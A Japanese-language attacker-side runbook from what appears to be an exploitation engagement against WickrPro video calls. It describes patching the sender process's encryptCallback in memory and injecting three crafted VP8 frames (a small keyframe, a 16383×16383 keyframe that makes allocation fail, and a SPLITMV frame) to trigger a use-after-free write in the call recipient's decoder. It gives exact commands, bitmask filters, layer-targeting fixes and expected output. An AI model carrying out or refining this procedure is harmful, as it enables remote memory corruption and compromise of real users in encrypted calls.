# RUNBOOK — 攻撃者機（通常機）

渡すもの: **`sender_inject.exe`** と、`--fire` 時のみ **`e2e-payload/`**（VP8 フレーム3枚 + manifest）。
Python 不要、`/MT` ビルドなので VC ランタイム不要、管理者権限不要。

> **★ 最重要 — 通話を始める前にアームする。**
> 送信グラフ（publish scene）は**通話開始時に1回だけ**構築されます。通話中にパッチを当てても
> 何も起きません。Wave 3 で踏んだ落とし穴です。順序は必ず **アーム → 通話開始**。

## 0. 事前確認

WickrPro を起動・ログインし、**通話前**に:

```
sender_inject.exe --verify
```

期待される出力:

```
[+] auto-detected WickrPro.exe PID nnnn
===== sender_inject (verify): PID nnnn  WickrPro=0x......  site=0x...... =====
    encryptCallback @0x...... : 49 8b c0 4d 85 c0   (ORIGINAL)
[+] --verify: site matches, exiting without patching
```

`*** MISMATCH ***` なら**そこで止める**。ツール側もパッチを拒否します。

## 1. 第1段階 — レコン（必ず先にこれ）

**何も書き換えません。**送信内容は一切変わらないので、被害者側にも異常は起きません。

```
sender_inject.exe --recon
```

`[+] ARMED (recon).` が出てから**通話を開始**し、**映像をオンに**して 15〜30 秒ほど流します。
その後 Ctrl+C。ログは **`sender-recon.log`**。

出力はこの形です:

```
pkt#1 Packet=0x...... planes=1 len=1234 ptr=0x...... stride=1234 height=1 f90=0x.... flag=0
```

### なぜレコンが要るか

`encryptCallback` は**音声パケットでも映像パケットでも発火**します。音声パケットに VP8
フレームを差し込んだら音声ストリームが壊れるだけなので、映像だけを選ぶ判別条件が要ります。

作業仮説は「`[Packet+0x90]` のビット1」です（受信側ではこのビットが Buffer 分岐を
ゲートしていることが Wave 4 で確定済み）。ただし**送信側では未実測**です。この engagement は
推測でリーチャビリティを4回間違えているので、実データを見てから決めます。

**`sender-recon.log` をそのまま送ってください。** `f90` と `len` でグループ分けすれば
音声群と映像群が分離できるはずで、そこから `--fire` の判別条件を確定します。

## 2. 第2段階 — 発射

レコンで判別条件が確定したので、**引数は不要**になりました:

```
sender_inject.exe --fire e2e-payload
```

既定が `--mask 0x2 --value 0x0`（bit1=0 = 映像。レコンで確定）で、**レイヤーはツールが自動で
両方に流します**。

### なぜレイヤーを両方に流すのか（第1回の失敗の原因）

レコンで、映像が **bit14 で2つのサイマルキャストレイヤーに分かれ、ほぼ1パケットごとに交互**に
出ていることが分かりました（run-length ヒストグラム `{1:574, 2:161, 3:1}`、先頭40件
`1011011011011011...`）。

第1回は `--mask 0x4002 --value 0x4000` で bit14=1 側だけに撃ちました。合致パケットは 241 発
あったので送信自体は成功していますが、**被害者はそのレイヤーをデコードしていなかった**ため
何も起きませんでした（被害者ログは `360x360` の1回のみ）。

現在はレイヤーごとに独立したカウンタを持ち、**bit14=0 と bit14=1 の両方に A,B,C を順番に**
流します。どちらを被害者がデコードしていても完全な列が届きます。

出力はこうなります:

```
[fire] layer0 1/3 subst, layer1 1/3 subst (matching L0=1 L1=1)
[fire] layer0 2/3 subst, layer1 2/3 subst (matching L0=3 L1=2)
[fire] layer0 3/3 subst, layer1 3/3 subst (matching L0=4 L1=4)
```

`matching L0/L1` は各レイヤーで条件に合致した累計パケット数で、増え続けます。**実際に
差し替わったのは各レイヤー先頭3発だけ**です（`subst` の分子が 3 で止まります）。

### 3枚は連続して届く必要があります

| フレーム | 役割 |
|---|---|
| A (41 B) | 小さいキーフレーム。dangling する mip ブロックを確保させる |
| B (34 B) | 16383×16383 キーフレーム。**確保が失敗**して `pc->mi` が dangling になる |
| C (108 B) | SPLITMV インターフレーム。dangling ポインタ経由で指定バイトを書く |

間に本物のキーフレームが挟まると `vp8_alloc_frame_buffers` が再走して `pc->mi` が
**修復されてしまい**、UAF が消えます。だから3枚を連続で差し替えます。

## 3. 覚えておくこと

* **ディスク上の WickrPro.exe は一切変更しません。**メモリ上のコピーだけです。Ctrl+C を押す前に
  落ちても、再起動すれば元通りです。
* サイトは 6 バイト（`mov rax,r8` / `test r8,r8`）を退避して `E9` + `NOP`。この範囲に飛び込む
  分岐は無いことを確認済みです。
* スタブが触るのは `rax`/`r10`/`r11` だけで、push を一切しません。退避した2命令は最後に実行
  されるので、戻り値もフラグも正しいままです。
* エンコーダは**動かしたまま**です。だからネゴシエーションは `vp8` のままで、被害者は普通に
  購読します。（Wave 3 でエンコーダごと外した結果、被害者が
  `Unsupported codec (<null>)` で購読拒否した失敗があります。）

## 4. 被害者側との段取り

1. 被害者機: `victim_probe.exe` をアーム（`RUNBOOK-victim.md`）
2. 攻撃者機: `sender_inject.exe --recon` をアーム
3. 通話開始、映像オン、20〜30 秒
4. 両方 Ctrl+C、`sender-recon.log` と `victim-probe.log` を回収して送付

この時点では**どちらのプロセスも落ちません**。`--fire` の第3段で初めて被害者が落ちます。
